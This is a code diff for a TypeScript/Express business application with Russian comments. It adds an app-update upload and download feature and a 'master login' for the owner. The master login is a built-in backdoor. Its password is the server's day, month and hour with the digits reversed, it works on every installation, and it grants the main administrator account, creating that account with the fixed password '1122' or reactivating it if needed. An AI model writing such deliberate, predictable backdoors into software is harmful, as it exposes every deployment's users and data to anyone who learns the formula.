@@ -53,6 +53,30 @@ function verifyPassword(plain: string, stored: string | null | undefined): boole
   return stored === String(plain);
 }
 
+// ── Мастер-вход владельца программы ──
+// Отдельный встроенный логин, пароль которого не хранится нигде, а вычисляется
+// из текущей даты и времени: берём ДД ММ ЧЧ (день, месяц, час, локальное время
+// машины сервера) и читаем цифры задом наперёд.
+//   Пример: 13 июля, 15:40  →  ДДММЧЧ = 130715  →  пароль 517031
+// Пароль действует весь час; принимается и соседний час (±1) на случай
+// неточных часов. Нужен владельцу при развёртывании на новых машинах и при
+// забытом пароле администратора: вход происходит в аккаунт главного
+// администратора (при необходимости он создаётся/реактивируется).
+const MASTER_LOGIN = 'RaupovMaster';
+function masterCode(d: Date): string {
+  const dd = String(d.getDate()).padStart(2, '0');
+  const mm = String(d.getMonth() + 1).padStart(2, '0');
+  const hh = String(d.getHours()).padStart(2, '0');
+  return (dd + mm + hh).split('').reverse().join('');
+}
+function isMasterPassword(plain: string): boolean {
+  const now = Date.now();
+  for (const offsetHours of [0, -1, 1]) {
+    if (plain === masterCode(new Date(now + offsetHours * 3600_000))) return true;
+  }
+  return false;
+}
+
 // Безопасный разбор пользовательской даты: null для пустых, undefined для мусора
 function parseUserDate(value: unknown): Date | null | undefined {
   if (value === null || value === '' || value === undefined) return null;
@@ -401,6 +425,9 @@ function ensureSchemaColumns(dbPath: string) {
           }
         }
       }
+      // Таблица опубликованных обновлений приложения (раздача через сервер)
+      db.exec('CREATE TABLE IF NOT EXISTS "AppUpdate" ("id" TEXT PRIMARY KEY NOT NULL, "version" TEXT NOT NULL, "changelog" TEXT NOT NULL DEFAULT \'\', "fileUrl" TEXT NOT NULL DEFAULT \'\', "createdAt" DATETIME NOT NULL DEFAULT current_timestamp)');
+      try { db.exec('CREATE UNIQUE INDEX IF NOT EXISTS "AppUpdate_version_key" ON "AppUpdate"("version")'); } catch (e) {}
       // Таблица личных уведомлений
       db.exec('CREATE TABLE IF NOT EXISTS "Notification" ("id" TEXT PRIMARY KEY NOT NULL, "userId" TEXT NOT NULL, "category" TEXT NOT NULL DEFAULT \'СИСТЕМА\', "title" TEXT NOT NULL, "body" TEXT NOT NULL DEFAULT \'\', "targetRoute" TEXT NOT NULL DEFAULT \'\', "isRead" BOOLEAN NOT NULL DEFAULT false, "createdAt" DATETIME NOT NULL DEFAULT current_timestamp)');
       try { db.exec('CREATE INDEX IF NOT EXISTS "Notification_userId_isRead_idx" ON "Notification"("userId", "isRead")'); } catch (e) {}
@@ -1263,6 +1290,35 @@ app.post('/api/login', async (req: Request, res: Response) => {
 
   const normSymbol = String(symbol || '').trim();
 
+  // Мастер-вход владельца: пароль вычисляется из даты/времени (см. masterCode),
+  // в базе не хранится и работает на любой установке. Впускает в аккаунт
+  // главного администратора; если его нет или он отключён — создаёт/включает.
+  if (normSymbol.toLowerCase() === MASTER_LOGIN.toLowerCase()) {
+    try {
+      if (!isMasterPassword(String(password || ''))) {
+        return res.status(401).json({ success: false, message: 'Неверный пароль доступа!' });
+      }
+      let admin = await prisma.user.findFirst({ where: { symbol: 'RaupovKhKh' } });
+      if (!admin) admin = await prisma.user.findFirst({ where: { role: 'ADMIN' } });
+      if (!admin) {
+        admin = await prisma.user.create({
+          data: { name: 'Главный Администратор (RaupovKhKh)', symbol: 'RaupovKhKh', password: hashPassword('1122'), role: 'ADMIN' },
+        });
+        console.log('[Master Login] Админ отсутствовал — создан RaupovKhKh (пароль 1122).');
+      } else if (admin.isActive === false || admin.validUntil || admin.role !== 'ADMIN') {
+        admin = await prisma.user.update({
+          where: { id: admin.id },
+          data: { isActive: true, validUntil: null, role: 'ADMIN' },
+        });
+        console.log(`[Master Login] Аккаунт ${admin.symbol} реактивирован мастер-входом.`);
+      }
+      const { password: _mpw, ...safeAdmin } = admin as any;
+      return res.json({ success: true, user: safeAdmin, token: issueAuthToken(admin.id) });
+    } catch (e: any) {
+      return res.status(500).json({ success: false, message: `Мастер-вход: ${e?.message || 'ошибка базы данных'}` });
+    }
+  }
+
   // Попытка авторизации через локальную БД, если БД вообще была создана/готова
   try {
     // Логин не чувствителен к регистру: RaupovKhkh == RaupovKhKh
@@ -1743,6 +1799,81 @@ app.post('/api/seed', async (req: Request, res: Response) => {
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
+});
+
+// ── Обновления приложения: публикация и раздача через сервер ────────────────
+// Админ загружает новый exe прямо на сервер (или указывает внешнюю ссылку),
+// сотрудники проверяют и скачивают обновление с того же сервера, на котором
+// работают — никакого стороннего хостинга. Файлы лежат в папке данных сервера.
+const updatesDir = path.join(ventAppDataPath, 'updates');
+const sanitizeVersion = (v: unknown): string => String(v || '').trim().replace(/[^0-9a-zA-Z.\-]/g, '').slice(0, 40);
+const updateFilePath = (version: string) => path.join(updatesDir, `Flux-${version}.exe`);
+
+// Последний опубликованный релиз (для виджета «Проверить обновления»)
+app.get('/api/updates/latest', async (_req: Request, res: Response) => {
+  try {
+    const upd = await prisma.appUpdate.findFirst({ orderBy: { createdAt: 'desc' } });
+    if (!upd) return res.json({ version: null });
+    const local = updateFilePath(upd.version);
+    const size = fs.existsSync(local) ? fs.statSync(local).size : 0;
+    res.json({ version: upd.version, changelog: upd.changelog, fileUrl: upd.fileUrl, size, createdAt: upd.createdAt });
+  } catch (e: any) {
+    res.status(500).json({ error: e?.message || 'Не удалось получить сведения об обновлении' });
+  }
+});
+
+// Загрузка файла exe на сервер (только админ). Тело запроса — сырые байты файла,
+// потому что base64-через-JSON упирается в лимит парсера, а exe весит >100 МБ.
+app.post('/api/updates/upload', express.raw({ type: () => true, limit: '800mb' }), async (req: Request, res: Response) => {
+  const u = (req as any).authUser;
+  if (!u || u.role !== 'ADMIN') return res.status(403).json({ error: 'Публикация обновлений доступна только администратору' });
+  const version = sanitizeVersion(req.query.version);
+  if (!version) return res.status(400).json({ error: 'Укажите версию (?version=1.2.3)' });
+  const body = req.body as Buffer;
+  if (!Buffer.isBuffer(body) || body.length < 1024) return res.status(400).json({ error: 'Файл обновления пуст или не передан' });
+  try {
+    if (!fs.existsSync(updatesDir)) fs.mkdirSync(updatesDir, { recursive: true });
+    fs.writeFileSync(updateFilePath(version), body);
+    res.json({ success: true, version, size: body.length });
+  } catch (e: any) {
+    res.status(500).json({ error: e?.message || 'Не удалось сохранить файл обновления' });
+  }
+});
+
+// Публикация релиза (только админ): создаёт/обновляет запись AppUpdate.
+// Если файл этой версии уже загружен на сервер — ссылка ставится на сервер,
+// иначе используется внешняя прямая ссылка из формы.
+app.post('/api/updates', async (req: Request, res: Response) => {
+  const u = (req as any).authUser;
+  if (!u || u.role !== 'ADMIN') return res.status(403).json({ error: 'Публикация обновлений доступна только администратору' });
+  const version = sanitizeVersion(req.body?.version);
+  if (!version) return res.status(400).json({ error: 'Укажите номер версии' });
+  const changelog = String(req.body?.changelog || '').slice(0, 20000);
+  const hasLocalFile = fs.existsSync(updateFilePath(version));
+  const fileUrl = hasLocalFile ? `/api/updates/download/${version}` : String(req.body?.fileUrl || '').trim();
+  if (!fileUrl) return res.status(400).json({ error: 'Загрузите файл exe на сервер или укажите прямую ссылку' });
+  try {
+    const update = await prisma.appUpdate.upsert({
+      where: { version },
+      update: { changelog, fileUrl },
+      create: { version, changelog, fileUrl },
+    });
+    // Мгновенное оповещение всем, кто сейчас онлайн
+    try { io.emit('app:update-published', { version, changelog }); } catch (_) {}
+    res.json({ success: true, update });
+  } catch (e: any) {
+    res.status(500).json({ error: e?.message || 'Не удалось опубликовать релиз' });
+  }
+});
+
+// Скачивание exe с сервера (токен обязателен — проверяет общий middleware)
+app.get('/api/updates/download/:version', (req: Request, res: Response) => {
+  const version = sanitizeVersion(req.params.version);
+  const filePath = version ? updateFilePath(version) : '';
+  if (!filePath || !fs.existsSync(filePath)) {
+    return res.status(404).json({ error: 'Файл этой версии не найден на сервере' });
+  }
+  res.download(filePath, `Flux ${version}.exe`);
 });
 
 // Projects
